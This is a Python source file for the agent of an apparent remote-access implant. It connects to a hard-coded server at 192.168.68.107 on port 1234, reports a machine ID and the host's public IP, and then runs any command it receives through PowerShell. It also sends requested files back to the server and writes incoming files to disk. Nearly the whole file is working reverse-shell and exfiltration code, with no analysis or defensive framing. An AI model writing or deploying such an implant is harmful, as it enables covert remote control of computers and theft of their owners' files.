import socket
import subprocess
import os
import uuid
import requests

from FileTransfer import receive_file_from_server, receive_file_from_client


def get_agent_id():
    # Generate a unique agent ID based on machine and network information
    return str(uuid.uuid1())


def get_public_ip():
    try:
        # Use a public service to fetch the IP address
        response = requests.get('https://api.ipify.org?format=json')
        if response.status_code == 200:
            public_ip = response.json()['ip']
            return public_ip
        else:
            print("Failed to retrieve public IP")
            return None
    except Exception as e:
        print(f"Error: {e}")
        return None


def execute_command(command):
    try:
        if command.startswith("cd"):
            os.chdir(command[3:].strip())
            return "Directory changed to " + os.getcwd()
        elif command.startswith("get"):
            file_path = command[4:].strip().replace("`", "")
            if os.path.exists(file_path):
                with open(file_path, "rb") as file:
                    return file.read()
            else:
                return f"File not found at path: {file_path}"
        else:
            output = subprocess.check_output(["powershell", command], shell=True, stderr=subprocess.STDOUT, text=True)
            return output
    except subprocess.CalledProcessError as e:
        return str(e)


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.68.107', 1234))  # Replace 'server_ip' with the actual server IP address

    # Get the public IP address
    public_ip = get_public_ip()

    # Send Agent ID and public IP address to the server
    agent_id = get_agent_id()
    client.send(agent_id.encode('utf-8'))
    client.send(public_ip.encode('utf-8'))

    while True:
        # Receive selected_agent from the server
        selected_agent = client.recv(4096).decode('utf-8')

        command = client.recv(4096).decode('utf-8')
        if command.lower() == 'exit':
            break
        elif command.startswith("send"):
            file_path = command[5:].strip().replace("`", "")
            receive_file_from_server(client, file_path)
            # Send acknowledgment to the server that file upload is complete
            client.send("File upload complete".encode('utf-8'))
        elif command.startswith("get"):
            file_path = command[5:].strip().replace("`", "")
            receive_file_from_client(client, file_path)
            client.send("File upload complete".encode('utf-8'))
        else:
            output = execute_command(command)
            if isinstance(output, bytes):
                client.send(output)
                acknowledgment = client.recv(4096).decode('utf-8')
                print(acknowledgment)
                if acknowledgment == "File received successfully":
                    client.send("next_menu".encode('utf-8'))
                else:
                    print("Error receiving file acknowledgment.")
                    break
            else:
                client.send(output.encode('utf-8'))

    client.close()


if __name__ == "__main__":
    main()
